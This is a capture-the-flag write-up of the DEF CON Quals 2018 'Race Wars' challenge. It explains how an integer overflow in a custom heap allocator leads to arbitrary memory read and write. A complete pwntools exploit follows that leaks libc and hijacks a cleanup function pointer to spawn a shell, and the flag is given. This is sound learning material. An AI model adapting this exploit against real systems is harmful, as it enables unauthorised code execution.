Race Wars  
---------

### Description:

Jhonny: I gotta get you racing again so I can make some money off your ass.  
Me: We'll see..

### First checks:

```bash  
$ file ./racewars: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked  
$ checksec --file ./racewars:  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

### After some hours of reversing

We reversed all the basic interaction functions. Such as: choose_engine(),
choose_chassis(), etc.. Most of them are just  
fake and do not allow you to actually make a choice.

We understood that upgrade_transmission(transmission_struct * transmission)
could have been the game winner. In fact it doas  
not carefully checks for memory bounds when upgrading the Nth gear ratio. If
transmission->gears_num is set to 0xffffffffffffffff  
then you can easily gain both arbitrary read and write (byte per byte).

```c  
unsigned __int64 __fastcall upgrade_transmission(transmission_struct
*transmission)  
{  
 __int64 inserted_value; // [rsp+10h] [rbp-20h]  
 __int64 confirm; // [rsp+18h] [rbp-18h]  
 __int64 selected_gear; // [rsp+20h] [rbp-10h]  
 unsigned __int64 v5; // [rsp+28h] [rbp-8h]

 v5 = __readfsqword(0x28u);  
 inserted_value = -1LL;  
 confirm = -1LL;  
 selected_gear = -1LL;  
 printf("ok, you have a transmission with %zu gears\n",
transmission->gears_num);  
 printf("which gear to modify? ");  
 __isoc99_scanf("%zu", &inserted_value);  
 if ( transmission->gears_num > (unsigned __int64)--inserted_value )  
 {  
   printf(  
     "gear ratio for gear %zu is %zu, modify to what?: ",  
     inserted_value + 1,  
     (unsigned __int8)transmission->ratios[inserted_value + 1]);  
   selected_gear = inserted_value;  
   __isoc99_scanf("%zu", &inserted_value);  
   printf("set gear to %d\n? (1 = yes, 0 = no)", inserted_value);  
   __isoc99_scanf("%zu", &confirm);  
   if ( confirm )  
     transmission->ratios[selected_gear + 1] = inserted_value;  
 }  
 else  
 {  
   puts("ERROR: can't modify this gear.");  
 }  
 return __readfsqword(0x28u) ^ v5;  
}  
```  
So we started searching for a bug that could give us the chance to overwrite
that variable.  
We basically reversed all of the functions, including the ones handling the
custom allocator used  
by the program. It was intersting to notice that the custom heap management
would not put any  
boundaries between its allocation. For instance a transmission_struct could
have been right next  
to a chassis one with no chunk headers or any byte separating them.

### We finally found the bug

After hours spent reversing we realized the bug was instead under our eyes all
the time.  
The choose_tires() function (fragment below) is in fact asking for how many
pairs of tires we want for our car.  
For obvious reasons we must input a number grater or equal then 2. This input
is then  multiplied for  32  
(the size of tire_struct) and passed to get_object_memory() function as its
argument.  
We can just adjust the number of tires to pass the check but overflow the
integer to trigger a get_object_memory(0).  
This ends up returning a valid tire_struct() pointer but not updating the
top_chunk addr in the custom  
arena struct.

```c  
 puts("how many pairs of tires do you need?");  
 __isoc99_scanf("%d", &tires_pairs);  
 if ( tires_pairs <= 1 )  
 {  
   puts("you need at least 4 tires to drive...");  
   exit(1);  
 }  
 v5 = 32 * tires_pairs;  
 v6 = (tyre_struct *)get_object_memory((custom_arena *)buffer, 32 *
tires_pairs);  
 if ( v6 )  
   *tires_num = 2 * tires_pairs;  
```

### Exploit strategy

Ok now if we go with something like:  
```  
choose_chassis()  
choose_engine()  
choose_tires() --> 2**27 pairs  
choose_transmission()  
```  
We should end in a state in which tires_struct and transmission_struct are
allocated in the same memory area.  
Modifying the tires_struct with the upgrade_tires() function should end up in
overwriting the transmission->gears_num  
value.  
To achieve a call to system('/bin/sh\x00') we found convinient to overwrite
custom function pointers implemented by the allocator,  
which are used in the cleaning_up function (sub_4009F3()) showed below.

```c  
void __fastcall cleaning_up(custom_arena *buffer)  
{  
 custom_arena *ptr; // ST10_8  
 custom_arena *next_arena; // [rsp+18h] [rbp-18h]  
 bin_struct *j; // [rsp+20h] [rbp-10h]  
 function_struct *i; // [rsp+28h] [rbp-8h]

 for ( i = (function_struct *)buffer->functions_list; i; i = (function_struct
*)i->next_func )  
 {  
   if ( i->function )  
     ((void (__fastcall *)(_QWORD))i->function)(i->arg);  
 }  
```  
We just need to place a pointer (using of course our arbitrary write) to a
struct built as follows:  
```  
ptr_to_function  
ptr_to_argument  
0x00  
```

Calculating offsets to system() and "/bin/sh" its easy since libc is provided
with the challenge.

### Final exploit

```python  
#!/usr/bin/env python2

from pwn import *

# context(log_level='debug')

libc = ELF('./libc-2.23.so')  
#p = process(argv=('/home/andrea/ld-2.23.so', '--library-path', '.',
'./racewars'))  
p = remote('2f76febe.quals2018.oooverflow.io', 31337)

def pow_hash(challenge, solution):  
   return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q',
solution)).hexdigest()

def check_pow(challenge, n, solution):  
   h = pow_hash(challenge, solution)  
   return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):  
   candidate = 0  
   while True:  
       if check_pow(challenge, n, candidate):  
           return candidate  
       candidate += 1

p.recvuntil('Challenge: ')  
challenge = p.recvuntil('\n')[:-1]  
p.recvuntil('n: ')  
n = int(p.recvuntil('\n')[:-1])

print('Solving challenge: "{}", n: {}'.format(challenge, n))

solution = solve_pow(challenge, n)  
print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))  
p.sendline(str(solution))

def menu(n):  
   p.recvuntil('CHOICE: ')  
   p.sendline(str(n))

def pick_tires(pairs):  
   menu(1)  
   p.recvuntil('need?')  
   p.sendline(str(pairs))

def pick_chassis():  
   menu(2)  
   p.recvuntil('eclipse\n')  
   p.sendline('1')

def pick_engine():  
   menu(3)

def pick_transmission(manual=True):  
   menu(4)  
   p.recvuntil('transmission?')  
   p.sendline('1' if manual else '0')

def edit_tires(width, ratio, construction, diameter):  
   menu(1)  
   p.recvuntil('what?\n')  
   p.sendline('1')  
   p.recvuntil('width: ')  
   p.sendline(str(width))  
   menu(1)  
   p.recvuntil('what?\n')  
   p.sendline('2')  
   p.recvuntil('ratio: ')  
   p.sendline(str(ratio))  
   menu(1)  
   p.recvuntil('what?\n')  
   p.sendline('3')  
   p.recvuntil('construction (R for radial): ')  
   p.sendline(str(construction))  
   menu(1)  
   p.recvuntil('what?\n')  
   p.sendline('4')  
   p.recvuntil('diameter: ')  
   p.sendline(str(diameter))

def edit_transmission(gear, ratio, confirm=True):  
   menu(4)  
   p.recvuntil('modify? ')  
   p.sendline(str(gear))  
   p.recvuntil(' is ')  
   old = int(p.recvuntil(',')[:-1])  
   p.recvuntil('what?: ')  
   p.sendline(str(ratio))  
   p.recvuntil('0 = no)')  
   p.sendline('1' if confirm else '0')  
   return old

pick_chassis()  
pick_engine()

pick_tires(2**27)

pick_transmission()

edit_tires(0xffff, 0xffff, 0xffff, 0xffff)

def write_byte(offset, value):  
   edit_transmission(offset, ord(value))

def read_byte(offset):  
   return chr(edit_transmission(offset, 0, False))

read_qword = lambda offset : u64(''.join(map(read_byte, range(offset,
offset+8))))

heap_leak = read_qword(-48)  
bin_offset = 0x400000 - heap_leak - 0x38

puts = read_qword(bin_offset + 0x203020)  
libc_base = puts - libc.symbols['puts']

system = libc_base + libc.symbols['system']  
binsh = libc_base + libc.search('/bin/sh\x00').next()

scratch = bin_offset + 0x203100  ## offset to 0x603100  
print "scratch : " + hex(scratch)

def write_qword(offset, value):  
   pk = p64(value)  
   for i in range(8):  
       write_byte(offset+i, pk[i])

write_qword(scratch, system)  
write_qword(scratch+8, binsh)  
write_qword(scratch+16, 0)

write_qword(-128, 0x603100)

menu(6)

p.interactive()

```

### Johnny thinks he's good, johnny just got pwned !

Flag: `OOO{4 c0upl3 0f n1554n 5r205 w0uld pull 4 pr3m1um 0n3 w33k b3f0r3 r4c3
w4rz}`

Original writeup
(https://mhackeroni.it/archive/2018/05/20/defconctfquals-2018-all-
writeups.html#race-wars).